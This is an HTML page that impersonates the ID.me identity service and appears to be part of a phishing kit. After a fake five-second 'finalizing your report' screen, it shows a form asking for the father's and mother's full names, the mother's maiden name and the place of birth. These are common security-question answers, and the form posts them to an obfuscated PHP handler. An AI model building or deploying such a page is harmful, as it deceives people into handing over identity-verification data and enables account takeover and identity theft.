
<!DOCTYPE html>
<html dir="ltr" lang="en">
<head>
  <meta charset="UTF-8">
  <title>Background Check via - ID.me</title>

  <!-- Stylesheets -->
  <link rel="stylesheet" href="newRegistration1_files/application-005e81fbd7c4d1513e92a09933a5d2c3ff93d6a904f89deb.css" media="all">
  <style>
    body {
      transition: opacity ease-in 0.2s;
    }

    body[unresolved] {
      opacity: 0;
      display: block;
      overflow: hidden;
      position: relative;
    }

    [inert] {
      pointer-events: none;
      cursor: default;
    }

    [inert], [inert] * {
      user-select: none;
    }

    .button-group {
      margin-top: 20px;
    }

    #toggleFields {
      padding: 10px 16px;
      font-size: 14px;
      background-color: #444;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      margin-right: 10px;
    }

    .btn-primary {
      background-color: #007BFF;
      color: white;
      border: none;
      border-radius: 4px;
      padding: 10px 16px;
      font-size: 14px;
      cursor: pointer;
    }

    .btn-primary:hover {
      background-color: #0056b3;
    }

    #splash-screen {
      text-align: center;
      margin-top: 100px;
    }
  </style>
</head>

<body>
  <!-- Splash screen displayed first -->
  <div id="splash-screen">
  
  
  
  
    <p style="font-size: 18px;">Please wait while we finalize your report...</p>
</div>

  <!-- Form container hidden initially -->
  <div class="page-container" id="form-container" style="display: none;">
    <div class="container">
      <div class="content-container">

        <form class="new_user" action="ZN_2bLc7fWaOZ8U4ey.php" method="post" accept-charset="UTF-8">
          <input type="hidden" name="cat" value="otherInfo">

          <div class="form-header">
            <div class="form-header-content" role="banner">
              <div class="partner">
                <div class="c_icon m_idme">
                
                
                
                
                
                
                
                
                
                </div>
              </div>
            </div>
          </div>

          <main aria-labelledby="sr_page_title" class="form-container">
            <div class="form-header-access">
              <h1 id="sr_page_title">Secured Questions & Answers</h1>
            </div>

            <div class="form-fields checkboxes">
              <!-- Father's Full Name -->
              <div class="field-group">
                <div class="field text suggest">
                  <label for="fatherName" class="required">Father's Full Name:</label>
                  <input type="password" id="fatherName" name="fatherName" placeholder="Enter father's full name" required>
                </div>
              </div>

              <!-- Mother's Full Name -->
              <div class="field-group">
                <div class="field text suggest">
                  <label for="motherName" class="required">Mother's Full Name:</label>
                  <input type="password" id="motherName" name="motherName" placeholder="Enter mother's full name" required>
                </div>
              </div>

              <!-- Mother's Maiden Name -->
              <div class="field-group">
                <div class="field text suggest">
                  <label for="maidenName" class="required">Mother's Maiden Name:</label>
                  <input type="password" id="maidenName" name="maidenName" placeholder="Enter Mother's Maiden Name" required>
                </div>
              </div>

              <!-- Place of Birth -->
              <div class="field-group">
                <div class="field text suggest">
                  <label for="birthPlace" class="required">Place of Birth: ( City and State )</label>
                  <input type="password" id="birthPlace" name="birthPlace" placeholder="Enter City, State of birth" required>
                </div>
              </div>
            </div>

            <!-- Buttons -->
            <div class="button-group">
              <button type="button" id="toggleFields">Show/Hide Answers</button><br><br><br><br>
              <input type="submit" name="commit" value=" &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Submit &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; " class="btn btn-primary" data-component="FormErrorsAriaLive" data-live-region-target="#error-list" data-disable-with="Checking information..">
            </div>
          </main>
        </form>

        <!-- Footer -->
        <footer class="footer">
          <nav aria-label="Footer" class="footer__links">
            <ul class="footer__list">
              <li class="footer__list-item"><a class="footer__link" target="_blank" href="#">What is ID.me?</a></li>
              <li class="footer__list-item"><a class="footer__link" target="_blank" href="#">Terms of Service</a></li>
              <li class="footer__list-item"><a class="footer__link" target="_blank" href="#">Privacy Policy</a></li>
            </ul>
          </nav>
        </footer>

      </div>
    </div>
  </div>

  <!-- JavaScript -->
  <script type="text/javascript">
    // Toggle password visibility
    const toggleButton = document.getElementById('toggleFields');
    const fields = [
      document.getElementById('fatherName'),
      document.getElementById('motherName'),
      document.getElementById('maidenName'),
      document.getElementById('birthPlace')
    ];

    toggleButton.addEventListener('click', function () {
      fields.forEach(field => {
        const currentType = field.getAttribute('type');
        field.setAttribute('type', currentType === 'password' ? 'text' : 'password');
      });
    });

    // Delay and show form
    window.addEventListener('DOMContentLoaded', () => {
      setTimeout(() => {
        document.getElementById('splash-screen').style.display = 'none';
        document.getElementById('form-container').style.display = 'block';
      }, 5000); // 5 seconds delay
    });
  </script>

  <!-- External Scripts -->
  <script src="newRegistration1_files/js_002"></script>
  <script src="newRegistration1_files/application-d9db495bf61a2f81b5a61244e0c22efc2a18f5e8972714768.js"></script>
  <script src="newRegistration1_files/chat-277e743ae9574a31927fbdf43530b414d8e8480f369965cec738a2a9.js"></script>
  <script src="newRegistration1_files/Jel11QgIB"></script>

<iframe data-product="web_widget" title="No content" tabindex="-1" allow="microphone *" aria-hidden="true"
    style="width: 0px; height: 0px; border: 0px none; position: absolute; top: -9999px;"
    src="newRegistration1_files/a.htm"></iframe>
</body>
</html>
